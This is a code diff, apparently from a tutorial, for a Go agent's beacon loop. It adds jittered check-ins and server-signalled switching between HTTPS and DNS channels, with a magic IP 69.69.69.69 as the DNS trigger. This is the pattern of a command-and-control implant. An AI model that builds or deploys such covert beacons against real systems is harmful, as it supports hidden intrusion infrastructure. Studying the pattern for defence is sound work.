@@ -35,6 +35,10 @@ func CalculateSleepDuration(baseDelay time.Duration, jitterPercent int) time.Dur
 
 func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
 
+	// ADD THESE TWO LINES:
+	currentProtocol := cfg.Protocol // Track which protocol we're using
+	currentAgent := comm            // Track current agent (can change!)
+
 	for {
 		// Check if context is cancelled
 		select {
@@ -44,7 +48,7 @@ func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
 		default:
 		}
 
-		response, err := comm.Send(ctx)
+		response, err := currentAgent.Send(ctx)
 		if err != nil {
 			log.Printf("Error sending request: %v", err)
 			// Don't exit - just sleep and try again
@@ -52,21 +56,42 @@ func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
 			continue // Skip to next iteration
 		}
 
-		// BASED ON PROTOCOL, HANDLE PARSING DIFFERENTLY
+		// Check if this is a transition signal
+		if detectTransition(currentProtocol, response) {
+			log.Printf("TRANSITION SIGNAL DETECTED! Switching protocols...")
 
-		switch cfg.Protocol {
-		case "https":
-			// Parse and display response
-			var httpsResp server.HTTPSResponse
-			if err := json.Unmarshal(response, &httpsResp); err != nil {
-				log.Fatalf("Failed to parse response: %v", err)
+			// Figure out what protocol to switch TO
+			newProtocol := "dns"
+			if currentProtocol == "dns" {
+				newProtocol = "https"
 			}
 
-			log.Printf("Received response: change=%v", httpsResp.Change)
-		case "dns":
-			ipAddr := string(response)
-			log.Printf("Received response: IP=%v", ipAddr)
+			// Create config for new protocol
+			tempConfig := *cfg // Copy the config
+			tempConfig.Protocol = newProtocol
 
+			// Try to create new agent
+			newAgent, err := NewAgent(&tempConfig)
+			if err != nil {
+				log.Printf("Failed to create %s agent: %v", newProtocol, err)
+				// Don't switch if we can't create agent
+			} else {
+				// Update our tracking variables
+				log.Printf("Successfully switched from %s to %s", currentProtocol, newProtocol)
+				currentProtocol = newProtocol
+				currentAgent = newAgent
+			}
+		} else {
+			// Normal response - parse and log as before
+			switch currentProtocol { // Note: use currentProtocol, not cfg.Protocol
+			case "https":
+				var httpsResp server.HTTPSResponse
+				json.Unmarshal(response, &httpsResp)
+				log.Printf("Received response: change=%v", httpsResp.Change)
+			case "dns":
+				ipAddr := string(response)
+				log.Printf("Received response: IP=%v", ipAddr)
+			}
 		}
 
 		// Calculate sleep duration with jitter
@@ -82,4 +107,22 @@ func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {
 			return nil
 		}
 	}
+}
+
+// detectTransition checks if the response indicates we should switch protocols
+func detectTransition(protocol string, response []byte) bool {
+	switch protocol {
+	case "https":
+		var httpsResp server.HTTPSResponse
+		if err := json.Unmarshal(response, &httpsResp); err != nil {
+			return false
+		}
+		return httpsResp.Change
+
+	case "dns":
+		ipAddr := string(response)
+		return ipAddr == "69.69.69.69"
+	}
+
+	return false
 }
